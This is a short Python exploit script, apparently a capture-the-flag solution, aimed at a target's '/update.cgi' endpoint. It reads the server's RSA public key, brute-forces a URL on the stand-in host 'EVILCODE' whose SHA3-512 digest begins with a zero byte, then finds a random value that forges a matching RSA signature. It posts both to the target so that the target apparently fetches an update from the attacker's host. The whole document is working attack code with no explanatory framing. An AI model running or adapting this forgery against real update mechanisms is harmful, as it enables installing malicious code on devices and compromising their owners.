import sys
import requests
import re
import random
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA3_512
from base64 import b64encode

key = RSA.import_key(re.search(r'-----BEGIN PUBLIC KEY-----(.*)-----END PUBLIC KEY-----', requests.get(f"https://{sys.argv[1]}/update.cgi").text, flags=re.S)[0])

hash_found = False

url = b""

while not hash_found:
    padding = random.randbytes(2)
    url = b"https://EVILCODE/" + padding
    digest = SHA3_512.new(url).digest()
    hash_found = digest[0] == 0

print(url)

forged_signature = random.randbytes(512)
while pow(int.from_bytes(forged_signature, "big"), key.e, key.n).to_bytes(key.size_in_bytes(), "big")[-64] != 0:
    forged_signature = random.randbytes(512)

print(b64encode(forged_signature))

print(requests.post(f"https://{sys.argv[1]}/update.cgi", data={"url": url.decode('latin1'), "signature": b64encode(forged_signature).decode()}).text)
